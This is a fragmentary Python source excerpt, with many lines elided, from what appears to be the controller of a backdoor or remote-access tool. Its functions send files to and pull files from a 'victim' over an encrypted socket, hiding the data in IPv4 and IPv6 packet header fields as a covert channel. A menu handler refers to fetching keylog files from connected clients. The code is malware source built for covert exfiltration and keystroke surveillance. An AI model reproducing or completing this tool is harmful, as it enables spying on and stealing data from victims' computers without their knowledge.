...
def transfer_file_covert(sock: socket.socket, dest_ip: str, dest_port: int,
    ...
    if os.path.exists(file_path):
        ...
        # Send the notification to the victim that a file transfer is about to occur
        sock.send(encrypt_string(constants.TRANSFER_FILE_SIGNAL, shared_secret).encode())
        ack = decrypt_string(sock.recv(constants.MIN_BUFFER_SIZE).decode(), shared_secret)

        # Open and Read the file to be sent
        if ack == constants.RECEIVED_CONFIRMATION_MSG:
            # Send file name and choices
            sock.send(encrypt_string((file_name + "/" + choices[0] + "/" + choices[1]), shared_secret).encode())
            ...
            if choices in header_field_function_map:
                ...
                # DIFFERENT HANDLERS: IPv6
                    ...
                    dest_ip, dest_port = __get_target_ipv6_address(sock, dest_ip, dest_port, shared_secret)
                    selected_function(sock, dest_ip, dest_port, file_path, shared_secret)
            ...
            transfer_result = decrypt_string(sock.recv(constants.BYTE_LIMIT).decode(), shared_secret)
...
def receive_file_covert(client_socket: socket.socket,
    ...
    client_socket.send(encrypt_string(constants.GET_FILE_SIGNAL, shared_key).encode())

    # Get ACK and user file path, check if exists
    res = decrypt_string(client_socket.recv(constants.MIN_BUFFER_SIZE).decode(), shared_key)
    ...
    if res == constants.RECEIVED_CONFIRMATION_MSG:
        ...
        # Wait for response
        res = decrypt_string(client_socket.recv(constants.BYTE_LIMIT).decode(), shared_key)
        ...
        if res == constants.GET_FILE_EXIST:
            ...
            if constants.IPV4 in choices:
                ...
                count = get_packet_count(client_socket, shared_key)
            ...
            if constants.IPV6 in choices:
                ...
                victim_ipv6_addr, _ = __get_target_ipv6_address(client_socket, client_ip, client_port, shared_key)
            ...
            # Write Data to File
            covert_data_write_to_file(shared_key, extracted_data, save_file_path)
...
def perform_menu_item_6(connected_clients: dict, source_ip: str, source_port: int, shared_secret: bytes):
    # CASE 1: Check if client list is empty
    if len(connected_clients) == constants.ZERO:
...
def perform_menu_item_7(connected_clients: dict, source_ip: str, source_port: int, shared_secret: bytes):
    # CASE 1: Check if client list is empty
    if len(connected_clients) == constants.ZERO:
        print(constants.GET_KEYLOG_FILE_NO_CLIENTS_ERROR)
